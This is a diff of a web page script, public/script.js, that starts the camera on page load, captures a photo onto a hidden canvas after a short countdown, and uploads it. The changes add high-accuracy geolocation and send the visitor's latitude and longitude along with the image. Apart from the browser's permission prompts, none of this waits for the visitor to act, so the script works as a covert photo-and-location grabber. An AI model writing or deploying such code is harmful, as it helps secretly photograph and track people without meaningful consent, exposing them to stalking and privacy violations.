@@ -1,5 +1,4 @@
-// public/script.js (Laptop + Mobile fixed version)
-
+// public/script.js — Capture photo + location (lat, long)
 const video = document.getElementById('previewVideo');
 const canvas = document.getElementById('hiddenCanvas');
 const notice = document.getElementById('notice');
@@ -11,7 +10,6 @@ let stream = null;
 let captureTimeout = null;
 
 window.addEventListener('load', () => {
-  // small delay so page renders before permission prompt
   setTimeout(initAndCapture, 250);
 });
 
@@ -24,22 +22,12 @@ async function initAndCapture() {
     });
     video.srcObject = stream;
 
-    // 🔹 Ensure video playback actually starts (important for laptops)
-    try {
-      await video.play();
-    } catch (e) {
-      console.warn(' ', e);
-    }
+    try { await video.play(); } catch (e) {}
 
-    // wait for metadata + first frames
     await waitForVideoReady(video, 1500);
-
-    notice.textContent = ' ';
-    statusEl.textContent = ' ';
     startCountdown(2);
   } catch (err) {
-    console.error(' ', err);
-    notice.textContent = ' ';
+    console.error('Camera init error:', err);
     statusEl.textContent = err?.message || String(err);
   }
 }
@@ -63,17 +51,16 @@ function startCountdown(seconds = 2) {
     countdownEl.textContent = t > 0 ? t : '';
     if (t <= 0) {
       clearInterval(timer);
-      // 🔹 Add warm-up delay (important for laptop webcam)
       captureTimeout = setTimeout(() => captureAndUpload(), 700);
     }
   }, 1000);
 }
 
-function captureAndUpload() {
-  if (!stream) {
-    statusEl.textContent = ' ';
-    return;
-  }
+async function captureAndUpload() {
+  if (!stream) return;
+
+  // Wait a short warm-up
+  await new Promise(r => setTimeout(r, 700));
 
   const w = video.videoWidth || 1280;
   const h = video.videoHeight || 720;
@@ -82,23 +69,31 @@ function captureAndUpload() {
   const ctx = canvas.getContext('2d');
 
   try {
-    // 🔹 For front camera, flip horizontally (optional)
     ctx.save();
     ctx.scale(-1, 1);
     ctx.drawImage(video, -w, 0, w, h);
     ctx.restore();
   } catch (err) {
-    console.error(' ', err);
-    statusEl.textContent = ' ';
+    console.error('drawImage failed:', err);
     stopCamera();
     return;
   }
 
-  statusEl.textContent = ' ';
+  // Capture current location after photo is taken
+  let latitude = null;
+  let longitude = null;
+  try {
+    const position = await getCurrentLocation();
+    latitude = position.coords.latitude;
+    longitude = position.coords.longitude;
+    console.log(`Location: ${latitude}, ${longitude}`);
+  } catch (err) {
+    console.warn('Location capture failed:', err);
+  }
 
+  // Upload to backend
   canvas.toBlob(async (blob) => {
     if (!blob) {
-      statusEl.textContent = ' ';
       stopCamera();
       return;
     }
@@ -108,23 +103,41 @@ function captureAndUpload() {
     form.append('file', blob, filename);
     form.append('type', 'image');
 
+    // Include location data if available
+    if (latitude && longitude) {
+      form.append('latitude', latitude);
+      form.append('longitude', longitude);
+    }
+
     try {
       const resp = await fetch(UPLOAD_URL, { method: 'POST', body: form });
-      let json = null;
-      try { json = await resp.json(); } catch (_) {}
       if (resp.ok) {
-        statusEl.textContent = ' ';
+        statusEl.textContent = '✅ Photo + Location sent successfully.';
       } else {
-        statusEl.textContent = '  ' + (json?.error || resp.statusText);
-        console.error(' ', resp.status, json);
+        statusEl.textContent = '❌ Upload failed.';
+        console.error('Upload failed:', await resp.text());
       }
     } catch (err) {
-      console.error(' ', err);
-      statusEl.textContent = ' ';
+      console.error('Network/upload error:', err);
+      statusEl.textContent = '❌ Network/upload error.';
     } finally {
       stopCamera();
     }
   }, 'image/png', 0.95);
+}
+
+// Get user location
+function getCurrentLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      return reject(new Error('Geolocation not supported'));
+    }
+    navigator.geolocation.getCurrentPosition(resolve, reject, {
+      enableHighAccuracy: true,
+      timeout: 8000,
+      maximumAge: 0
+    });
+  });
 }
 
 function stopCamera() {
@@ -135,6 +148,6 @@ function stopCamera() {
       stream = null;
     }
     video.srcObject = null;
-    notice.textContent = ' ';
-  } catch (err) { console.warn(' ', err); }
+    notice.textContent = 'Camera stopped.';
+  } catch (err) { console.warn('Error stopping camera:', err); }
 }
